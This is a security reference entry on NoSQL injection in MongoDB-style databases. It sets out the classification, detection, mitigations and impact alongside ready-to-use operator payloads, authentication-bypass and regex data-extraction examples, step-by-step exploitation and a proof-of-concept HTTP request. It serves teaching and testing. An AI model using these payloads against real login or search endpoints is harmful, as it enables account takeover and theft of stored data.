📌 NoSQL Injection

🧠 Description

What is NoSQL Injection?

NoSQL databases (MongoDB, CouchDB, Redis, etc.) use JSON‑style queries instead of SQL. They have special operators like $ne (not equal), $gt (greater than), $regex (pattern match), and $where (JavaScript execution). If an application passes user input directly into a NoSQL query without sanitisation, an attacker can inject these operators to bypass authentication, extract data, or even execute arbitrary code.

Security principle violated: Input Validation

🏷️ Classification

  • Type: Injection
  • OWASP: A03:2021 – Injection
  • CWE: CWE-943: Improper Neutralization of Special Elements in Data Query Logic

🎯 Attack Surface

  • ✅ Login forms (JSON body, URL parameters)
  • ✅ Search/filter endpoints with JSON input
  • ✅ API endpoints accepting application/json
  • ✅ GraphQL queries

🔍 Detection Methodology

1. Static Analysis

Look for MongoDB queries using user input without validation, e.g., db.collection.find({username: req.body.username}).

2. Dynamic Analysis

  • Change a login request from {"username":"admin","password":"pass"} to {"username":"admin","password":{"$ne":""}}
  • If you log in without a real password, NoSQL injection is confirmed.

💣 Basic Payloads

{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "1==1"}
{"$or": []}
{"$nin": []}
🔐 Authentication Bypass
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$regex": "^.*"}}
📊 Data Extraction (Boolean)
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^a.*"}}
{"$where": "this.password.match(/^a/)"}

🧪 Test Cases (STRICT)

⚙️ Exploitation Steps

  1. Identify endpoints that accept JSON input (check Content-Type: application/json).
  2. Modify a login request: replace the password value with {"$ne": ""}.
  3. If login succeeds, authentication bypass is confirmed.
  4. Use $regex payloads to brute‑force character by character (similar to blind SQL injection).
  5. Extract full database contents using automated tools like NoSQLMap.

🛡️ Mitigation

✅ Use parameterised queries (MongoDB drivers support typed parameters)
✅ Validate and sanitise all user input – reject operator keys ($ne, $gt, etc.)
✅ Use schema validation to restrict allowed fields
✅ Apply least privilege database accounts

⚠️ Risk / Impact

Severity: Critical

Impact: Authentication bypass, unauthorised data access, data manipulation, potential RCE via $where (if JavaScript execution is enabled).

📎 Proof of Concept (PoC)

# Authentication bypass (MongoDB login)
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": ""}}

# Data extraction using regex
POST /search HTTP/1.1
Content-Type: application/json

{"username": {"$regex": "^admin"}, "role": "user"}
